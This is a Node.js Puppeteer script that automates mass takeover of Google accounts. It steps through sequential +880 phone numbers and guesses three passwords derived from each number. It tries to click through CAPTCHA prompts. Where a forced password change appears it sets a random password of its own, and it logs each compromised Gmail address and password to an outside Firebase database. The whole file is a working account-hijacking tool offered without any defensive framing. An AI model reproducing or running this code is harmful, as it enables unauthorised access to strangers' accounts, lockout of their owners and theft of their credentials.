const puppeteer = require('./Puppeteer.js')
const request = require('request')

let SERVER = ''
let SIRIAL = ''
let SIZE = 0
let database = null

let update = 0
let mLoadSuccess = false
let mPrevNumber = 0
let mPasswordTry = 0
let mCapture = false
let mPassword = 'null'
let mPasswordChange = false
let mLoadPassword = false
let mLogoutGmail = false
let mGmailCheck = false
let mNumber = 0
let mLoad = 0
let mSirial = 0
let timer = null

let page = null
let browser = null

let raiyan = ''
let signin = ''
        

module.exports = class {
    constructor (db, server, sirial, size) {
        SERVER = server
        SIRIAL = sirial
        SIZE = size
        database = db

        mLoadSuccess = false
        mPrevNumber = 0
        mNumber = 0
        mPasswordTry = 0
        mCapture = false
        mLoadPassword = false
        mLogoutGmail = false
        mGmailCheck = false
        mNumber = 0
        mLoad = 0
        mSirial = 0

        page = null
        browser = null

        raiyan = 'https://raiyan-088-default-rtdb.firebaseio.com/raiyan/number/'
        signin = 'https://accounts.google.com/signin/v2/identifier?service=accountsettings&hl=en-US&continue=https://myaccount.google.com/intro/security&csig=AF-SEnY7bxxtADWhtFc_:1556625798&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
        
        update = parseInt(new Date().getTime() / 1000)
        

        timer = setInterval(function() {
            let now = parseInt(new Date().getTime() / 1000)

            if(((now-update) > 60 && mLoadSuccess) || (mNumber == mPrevNumber && mLoadSuccess)) {
                console.log('---Restart Browser---')
                request.get({ url: 'xxx' }, function (error, response, body) { })
            }

            if(mLoadSuccess) {
                mPrevNumber = mNumber
            }
        },60000)
    }

    async start() {
        console.log('Downloading data...')

        request({
            url: raiyan+'sirial.json',
            json:true
        }, function(error, response, body){
            if(!error) {
                
            }
        })
        
        request({
            url: raiyan+'sirial.json',
            json:true
        }, function(error, response, body){
            if(!error) {
                mSirial = parseInt(body[SIRIAL])
                request({
                    url: raiyan+'server/'+SERVER+'.json',
                    json:true
                }, function(error, response, body){
                    if(!error) {
                        if(body['start_'+SIZE] == null) {
                            mNumber = parseInt(SIRIAL+mSirial+'000000')
                            database.child('server').child(SERVER).child('runing_'+SIZE).set(mNumber)
                            database.child('server').child(SERVER).child('start_'+SIZE).set(parseInt(SIRIAL+mSirial))
                            database.child('sirial').child(SIRIAL).set(mSirial+1)
                        } else {
                            mSirial = parseInt(body['start_'+SIZE])
                            mNumber = parseInt(body['runing_'+SIZE])
                            //mNumber = 1748043876
                        }
                        
                        if(mNumber == 0) {
                            console.log('Stop Service')
                            clearInterval(timer)
                        } else {
                            console.log('+880'+mNumber)
                            console.log('Download Success')
                            startService()
                        }
                    }
                })
            } else {
                console.log(error)
            }
        })
    }

}


async function startService() {

    ;(async () => {

        browser = await puppeteer.launch({
            headless: true,
            args: [ '--no-sandbox', '--disable-setuid-sandbox' ]
        })

        page = await browser.newPage()

        await page.setUserAgent('Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36')

        await page.setRequestInterceptionEnabled(true)
        
        page.on('request', async request => {
            const url = request.url
            update = parseInt(new Date().getTime() / 1000)
            if(url.startsWith('https://fonts.gstatic.com/s/') || url.startsWith('https://accounts.google.com/_/kids/signup/eligible') || url.startsWith('https://accounts.google.com/generate')) {
                request.abort()
            } else {
                request.continue()
            }

            if(url.startsWith('https://accounts.google.com/_/lookup/accountlookup') && mLoadSuccess) {
                await delay(1000)
                const output = await page.evaluate(() => {
                    let root = document.querySelector('div.o6cuMc')
                    if(root && root.innerHTML.includes(`Couldn't find your Google Account. Try using your email address instead.`)) {
                        return true
                    } else {
                        return false
                    }
                })

                const block = await page.evaluate(() => {
                    let root = document.querySelector('#headingText')
                    if(root && root.innerText.includes(`Couldn’t sign you in`)) {
                        return true
                    } else {
                        return false
                    }
                })

                if(block) {
                    mNumber++
                    mLoad++
                    mPasswordTry = 0
                    database.child('server').child(SERVER).child('runing_'+SIZE).set(mNumber)
                    page.goBack()
                } else {
                    if(output) {
                        mNumber++
                        mLoad++
                        if(parseInt(mSirial)+1 <= parseInt(mNumber/1000000)) {
                            database.child('server').child(SERVER).child('runing_'+SIZE).set(0)
                        } else {
                            if(mLoad % 10 == 0) {
                                console.log('ID:' +SIZE+' --- '+mLoad+' --- Null')
                                database.child('server').child(SERVER).child('runing_'+SIZE).set(mNumber)
                            }
                            await page.evaluate((number) => { let root = document.querySelector('input[type="email"]'); if(root) root.value = number }, '+880'+mNumber)
                            await page.evaluate(() => { try { let root = document.querySelector('#identifierNext'); if(root) root.click() } catch(e) {} })
                        }
                    }
                }
            } else if(url.startsWith('https://accounts.google.com/generate') && mLoadSuccess) {
                const output = await page.evaluate(() => {
                    let root = document.querySelector('#identifierNext')
                    if(root) {
                        return true
                    } else {
                        return false
                    }
                })

                mCapture = false

                const block = await page.evaluate(() => {
                    let root = document.querySelector('#headingText')
                    if(root && root.innerText.includes(`Couldn’t sign you in`)) {
                        return true
                    } else {
                        return false
                    }
                })

                if(block) {
                    mNumber++
                    mLoad++
                    mPasswordTry = 0
                    database.child('server').child(SERVER).child('runing_'+SIZE).set(mNumber)
                    page.goBack()
                } else {
                    if(output) {
                        await page.evaluate((number) => { let root = document.querySelector('input[type="email"]'); if(root) root.value = number }, '+880'+mNumber)
                        await page.evaluate(() => { try { let root = document.querySelector('#identifierNext'); if(root) root.click() } catch(e) {} })
                    } else {
                        await checkPassword()
                    }
                }
            } else if(url.startsWith('https://accounts.google.com/_/signin/challenge')) {
                await delay(1000)
                const output = await page.evaluate(() => {
                    let root = document.querySelector('div.OyEIQ.uSvLId')
                    if(root && (root.innerHTML.includes('Wrong password. Try again or click Forgot password to reset it') || root.innerHTML.includes('Your password was changed'))) {
                        return true
                    } else {
                        return false
                    }
                })
                
                if(output) {
                    await checkPassword()
                }
            } else if(url.startsWith('https://accounts.google.com/Captcha')) {
                if(!mCapture) {
                    mCapture = true
                    mPasswordTry = 0
                    mNumber++
                    mLoad++
                    let output = await page.evaluate(() => {
                        try {
                            let root = document.querySelector('div.YZrg6.HnRr5d.iiFyne.cd29Sd')
                            if(root) {
                                root.click()
                                return true
                            }
                        } catch (e) {}
                        return false
                    })

                    if(!output) {
                        database.child('server').child(SERVER).child('runing_'+SIZE).set(mNumber)
                        mPasswordTry = 0
                        await page.goto(signin)
                    }
                }
            } else if(mLoadPassword) {
                let pageUrl = page.url()
                if(pageUrl == 'https://myaccount.google.com/security' || pageUrl.startsWith('https://gds.google.com/web/chip') || pageUrl.startsWith('https://myaccount.google.com/signinoptions/recovery-options-collection')) {
                    mLoadPassword = false
                    mGmailCheck = true
                    await page.goto('https://myaccount.google.com/email')
                } else {
                    await delay(2000)
                    const header = await page.evaluate(() => {
                        let root = document.querySelector('#headingText')
                        if(root) {
                            let text = root.innerText
                            if(text.includes(`Verify it’s you`)) {
                                root = document.querySelectorAll('li.JDAKTe.cd29Sd.zpCp3.SmR8')
                                if(root) {
                                    for(let i=0; i<root.length; i++) {
                                        if(root[i].innerText.includes('Use another phone or computer to finish signing in')) {
                                            return '1'
                                        }
                                    }
                                }
                                return '2'
                            } else if(text.includes(`Couldn’t sign you in`)) {
                                return '3'
                            } else if(text.includes(`2-Step Verification`)){
                                return '4'
                            } else if(text.includes('Your account has been disabled')) {
                                return '5'
                            } else if(text.includes(`Change password`)) {
                                return '6'
                            }
                        }
                        return '0'
                    })

                    if(header != 0 && mLoadPassword) {
                        if(header == 6) {
                            mPasswordChange = true

                            let random = getRandomPassword()
                            if(random != mPassword) {
                                mPassword = random
                                await page.evaluate((pass) => {
                                    let root = document.querySelectorAll('input.whsOnd.zHQkBf')
                                    if(root) {
                                        if(root.length == 2) {
                                            root[0].value = pass
                                            root[1].value = pass
                                        }
                                    }
                                }, mPassword)
    
                                console.log('Password: '+mPassword)
    
                                await page.evaluate(() => document.querySelector('div.VfPpkd-RLmnJb').click())
                            }
                        } else {
                            mLoadPassword = false
                            mNumber++
                            mLoad++
                            if(header == 1) {
                                database.child('menually').child(mNumber-1).set(mPasswordTry)
                            } else {
                                database.child('reject').child(mNumber-1).set(mPasswordTry)
                            }
                            database.child('server').child(SERVER).child('runing_'+SIZE).set(mNumber)
                            mPasswordTry = 0
                            mPassword = 'null'
                            page.goBack()
                        }
                    }
                }
            } else if(mGmailCheck) {
                const gmail = await page.evaluate(() => {
                    let root = document.querySelector('div.mMsbvc')
                    if(root) {
                        return root.innerText
                    } else {
                        return null
                    }
                })

                if(gmail && mGmailCheck) {
                    mGmailCheck = false
                    mNumber++
                    mLoad++
                    let now = parseInt(new Date().getTime() / 60000)
                    database.child('server').child(SERVER).child('runing_'+SIZE).set(mNumber)
                    if(mPasswordChange) {
                        database.child('change').child(gmail.replace('@gmail.com', '').replace('.','')).set({ number : mNumber-1, pass : mPassword, time : now })
                        mPasswordChange = false
                        mPassword = 'null'
                    } else {
                        database.child('active').child(gmail.replace('@gmail.com', '').replace('.','')).set({ number : mNumber-1, pass : mPasswordTry, time : now })
                    }
                    mPasswordTry = 0
                    await delay(1000)
                    let temp = JSON.parse(fs.readFileSync('./cookies.json'))
                    await page.setCookie(...temp)
                    mLogoutGmail = true
                    mGmailAdress = gmail
                    await page.goto(signin)
                }
            } else if(mLogoutGmail) {
                const sinout = await page.evaluate(() => {
                    let root = document.querySelector('#headingText')
                    if(root && root.innerText.includes(`Choose an account`)) {
                        return true
                    } else {
                        return false
                    }
                })
                
                if(sinout && mLogoutGmail) {
                    mLogoutGmail = false
                    await page.evaluate(() => document.querySelector('ul.OVnw0d > li:nth-child(3) > div').click())
                    await delay(1000)
                    await page.evaluate(() => document.querySelector('ul.OVnw0d > li:nth-child(1) > div > div.n3x5Fb').click())
                    await delay(1000)
                    await page.evaluate(() => document.querySelector('div.ZFr60d.CeoRYc').click())
                }
            }
        })

        page.on('dialog', async dialog => dialog.type() == "beforeunload" && dialog.accept())
        
        await page.goto(signin)

        mLoadSuccess = true

        console.log('Load Success '+SIZE)
    })()
}

async function checkPassword() {
    if(mPasswordTry >= 3) {
        mPasswordTry = 0
        mNumber++
        mLoad++
        mLoadPassword = false
        if(parseInt(mSirial)+1 <= parseInt(mNumber/1000000)) {
            database.child('server').child(SERVER).child('runing_'+SIZE).set(0)
        } else {
            database.child('server').child(SERVER).child('runing_'+SIZE).set(mNumber)
            page.goBack()
        }
    } else {
        let password = ''
        if(mPasswordTry == 0) {
            password = '0'+mNumber
            console.log('ID:' +SIZE+' --- '+mLoad+' --- +88'+password)
        } else if(mPasswordTry == 1) {
            let temp = '0'+mNumber
            password = temp.substring(0, 8)
        } else if(mPasswordTry == 2) {
            let temp = '0'+mNumber
            password = temp.substring(3, 11)
        }
        await page.evaluate((pass) => document.querySelector('input[type="password"]').value = pass, password)
        mPasswordTry++
        await page.evaluate(() => document.querySelector('#passwordNext').click())
        mLoadPassword = true
    }
}

function getRandomPassword() {
    if(mPassword == 'null') {
        return Math.random().toString(36).slice(-10)
    } else {
        return mPassword
    }  
}

async function delay(time) {
    return new Promise(function(resolve) { 
        setTimeout(resolve, time)
    });
    }